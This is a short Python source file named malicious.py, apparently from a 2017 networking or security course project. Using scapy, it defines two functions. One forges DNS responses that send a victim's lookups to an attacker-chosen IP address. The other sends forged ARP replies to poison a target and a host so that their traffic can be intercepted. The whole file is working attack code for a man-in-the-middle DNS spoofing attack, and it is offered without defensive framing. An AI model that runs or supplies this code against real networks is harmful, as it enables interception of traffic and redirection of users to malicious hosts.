#/*********************************************************************************************
#       Name:	malicious.py
#
#       Developer:	Mat Siwoski/Shane Spoor
#
#       Created On: 2017-10-24
#
#       Description:
#       Creates and handles the spoofed packet.
#
#
#    Revisions:
#    (none)
#
###################################################################################################

#!/usr/bin/env python

from scapy.all import *

#########################################################################################################
# FUNCTION
#
#   Name:		spoofed_pkt
#
#   Prototype:	def spoofed_pkt(payload, pkt, rIP)
#
#   Developer:	Mat Siwoski/Shane Spoor
#
#   Created On: 2017-10-24
#
#   Parameters:
#   payload - the payload
#   pkt - the pkt to spoof
#   rIP - the returning IP
#
#   Return Values:
#	
#   Description:
#   This function takes and creates a spoofed packet.
#
#   Revisions:
#	(none)
#    
#########################################################################################################
def spoofed_pkt(nfpkt, pkt, rIP):
    spoofed = IP(dst=pkt[IP].src, src=pkt[IP].dst)/\
                  UDP(dport=pkt[UDP].sport, sport=pkt[UDP].dport)/\
                  DNS(id=pkt[DNS].id, qr=1, aa=1, qd=pkt[DNS].qd,\
                  an=DNSRR(rrname=pkt[DNS].qd.qname, ttl=10, rdata=rIP))
    nfpkt.set_payload(str(spoofed))
    nfpkt.accept()
    print(pkt[DNSQR].qname[:-1])

#########################################################################################################
# FUNCTION
#
#   Name:		ARPPoisonVictim
#
#   Prototype:	def ARPPoisonVictim(hostIP, targetIP, hostMACAddress, targetMACAddress)
#
#   Developer:	Mat Siwoski/Shane Spoor
#
#   Created On: 2017-10-24
#
#   Parameters:
#   hostIP - the host IP 
#   targetIP - the target IP
#   hostMACAddress - the host's MAC address
#   targetMACAddress - the target's Mac Address
#
#   Return Values:
#	
#   Description:
#   This function ARP Poison the target.
#
#   Revisions:
#	(none)
#    
#########################################################################################################
def ARPPoisonVictim(hostIP, targetIP, hostMACAddress, targetMACAddress):
    send(ARP(op=2, pdst=targetIP, psrc=hostIP, hwdst=targetMACAddress))
    send(ARP(op=2, pdst=hostIP, psrc=targetIP, hwdst=hostMACAddress))

